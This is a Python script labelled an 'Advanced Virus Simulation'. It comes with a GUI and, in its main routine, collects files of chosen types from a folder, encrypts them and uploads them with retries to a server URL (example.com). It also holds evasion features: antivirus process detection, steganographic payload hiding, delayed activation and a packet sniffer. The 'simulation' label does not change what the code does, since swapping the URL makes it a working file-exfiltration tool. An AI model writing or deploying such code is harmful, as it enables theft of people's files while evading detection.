
# Full Enhanced Code for Advanced Virus Simulation

import os
import shutil
import requests
from cryptography.fernet import Fernet
from stegano import lsb
import time
import socket
import psutil
from scapy.all import sniff
import platform
import tkinter as tk
import threading
import logging
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(filename="simulation_log.txt", level=logging.INFO, 
                    format="%(asctime)s - %(levelname)s - %(message)s")

# 1. Create Folder for Collected Data
def create_folder():
    folder_name = "collected_data"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    return folder_name

# 2. Encrypt Files
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# 3. Collect Files
def collect_files(target_folder, extensions, output_folder, key):
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            if file.endswith(tuple(extensions)):
                source = os.path.join(root, file)
                destination = os.path.join(output_folder, file)
                shutil.copy2(source, destination)
                encrypt_file(destination, key)
                logging.info(f"Collected and encrypted: {source}")

# 4. Send Files to Server with Retry Logic
def send_file(file_path, server_url):
    for attempt in range(3):  # Retry up to 3 times
        try:
            with open(file_path, 'rb') as f:
                response = requests.post(server_url, files={'file': f})
                if response.status_code == 200:
                    logging.info(f"Successfully sent: {file_path}")
                    return True
                else:
                    logging.warning(f"Failed to send {file_path}, attempt {attempt + 1}")
        except Exception as e:
            logging.error(f"Error sending {file_path} on attempt {attempt + 1}: {e}")
    return False

def send_files(output_folder, server_url):
    with ThreadPoolExecutor(max_workers=5) as executor:
        for root, dirs, files in os.walk(output_folder):
            for file in files:
                file_path = os.path.join(root, file)
                executor.submit(send_file, file_path, server_url)

# 5. Steganography
def hide_payload_in_image(image_path, payload):
    secret = lsb.hide(image_path, payload)
    secret.save("stego_image.png")
    logging.info("Payload hidden in image.")

def extract_payload_from_image(stego_image_path):
    logging.info("Extracting payload from image.")
    return lsb.reveal(stego_image_path)

# 6. Activation Mechanism with Delayed Start
def check_server_connection(server, port):
    try:
        socket.create_connection((server, port), timeout=5)
        logging.info(f"Server {server} reachable on port {port}.")
        return True
    except Exception:
        logging.warning(f"Server {server} not reachable on port {port}.")
        return False

def delayed_activation(delay_seconds):
    logging.info(f"Delaying activation by {delay_seconds} seconds.")
    time.sleep(delay_seconds)

# 7. Avoid Detection
def check_antivirus():
    antivirus_names = ["Windows Defender", "Norton", "McAfee"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in antivirus_names:
            logging.warning(f"Antivirus detected: {proc.info['name']}")
            return True
    return False

# 8. Sniff Network Traffic
def packet_sniffer(interface):
    logging.info(f"Starting packet sniffer on interface {interface}.")
    sniff(iface=interface, prn=lambda x: x.show(), count=10)

# 9. Check Platform
def check_platform():
    system = platform.system()
    logging.info(f"Running on: {system}")
    return system

# 10. Multi-threaded Clean Up
def clean_up(output_folder):
    logging.info("Starting cleanup of collected data.")
    for root, dirs, files in os.walk(output_folder):
        for file in files:
            os.remove(os.path.join(root, file))
    os.rmdir(output_folder)
    logging.info("Cleanup complete.")

# 11. Enhanced GUI with Status Updates
def create_gui():
    def start_simulation():
        threading.Thread(target=main).start()

    root = tk.Tk()
    root.title("Advanced Virus Simulation Tool")
    tk.Label(root, text="Welcome to the Advanced Simulation!").pack()
    tk.Button(root, text="Start Simulation", command=start_simulation).pack()
    tk.Label(root, text="Check logs for detailed information.").pack()
    root.mainloop()

# Main Execution
def main():
    try:
        # Setup
        target_folder = input("Enter the folder to collect files from: ")
        extensions = ['.txt', '.jpg', '.pdf']  # File types to collect
        server_url = "http://example.com/upload"  # Mock server URL
        output_folder = create_folder()

        # Generate Encryption Key
        key = generate_key()

        # Activation
        if not check_server_connection("example.com", 80):
            logging.warning("Server not reachable. Exiting.")
            return

        delayed_activation(5)  # Add delay for realism

        # Collect and Encrypt Files
        collect_files(target_folder, extensions, output_folder, key)

        # Send Files to Server
        send_files(output_folder, server_url)

        # Clean Up
        clean_up(output_folder)
        logging.info("Simulation Complete.")

    except Exception as e:
        logging.error(f"Error in simulation: {e}")

if __name__ == "__main__":
    create_gui()
